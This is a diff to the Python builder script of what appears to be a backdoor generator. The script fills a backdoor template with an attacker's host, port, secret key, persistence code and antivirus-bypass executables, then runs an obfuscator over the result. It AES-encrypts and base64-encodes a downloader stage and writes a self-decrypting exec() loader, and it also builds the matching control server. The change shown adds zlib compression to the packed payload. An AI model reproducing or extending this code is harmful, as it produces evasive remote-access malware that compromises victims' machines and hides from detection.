@@ -128,6 +128,7 @@ with open('base64/64', 'rb') as exe64:
 
 with open('stubs/backdoor.py', 'rb') as finalbackdoor:
 	readyscript = finalbackdoor.read().replace('**n', '\\n').replace('***HOST***', "funrot('" + frot(hostname) + "')").replace('***PORT***', "funrot('" + frot(portnumber) + "')").replace('***SECRET***', "funrot('" + frot(secretkey) + "')").replace('**r', '\\r').replace('***PERSIST***', persistpart).replace('***AES***', AESvar).replace('***B64D***',bd64var).replace('***ENV***', envvar).replace('***B64E***',be64var).replace('***JUNK***', junk).replace('***64EXE***', bypass64).replace('***86EXE***', bypass86).replace('***JUNK2***', junk2).replace('***XOR***', '%s[%s:%s]' % (junkvar, xoroffset, xoroffset + 1000)).replace('***URLO***', urlvar)
+
 with open('tempobfs.py', 'wb') as o:
 	o.write(readyscript)
 obstime = subprocess.Popen('python tools/pyobfuscate.py -s %s tempobfs.py' % randStr(random.randint(25,80)), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -174,12 +175,12 @@ with open(dlf, 'rb') as dl:
 
 with open('tempobfs.py', 'wb') as o:
 	o.write(downloaderscript)
-
 obstime = subprocess.Popen('python tools/pyobfuscate.py -s %s tempobfs.py' % randStr(random.randint(25,80)), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 downloaderscript = obstime.stdout.read()
 os.remove('tempobfs.py')
+
 cipher = AES.new(key2)
-downloader = base64.b64encode(EncodeAES(cipher, downloaderscript))
+downloader = base64.b64encode(EncodeAES(cipher, downloaderscript.encode('zlib')))
 
 with open(backdoorName, 'w') as f:
 	f.write('#!/usr/bin/env python\nimport ')
@@ -188,7 +189,7 @@ with open(backdoorName, 'w') as f:
 	f.write('try:\n\timport ')
 	f.write(",".join(mywindows) + "\n")
 	f.write('except:\n\tpass\n')
-	f.write("exec(%s(\"%s\"))" % (bd64var,base64.b64encode("exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" %(AESvar,key2,bd64var,downloader))))
+	f.write("exec(%s(\"%s\"))" % (bd64var,base64.b64encode("exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{').decode('zlib'))\n" %(AESvar,key2,bd64var,downloader))))
 
 with open('stubs/server.py', 'rb') as rawserv:
 	finalserver = rawserv.read().replace('**n', '\\n').replace('**r', '\\r').replace('***SECRET***', secretkey).replace('***PORT***', portnumber)
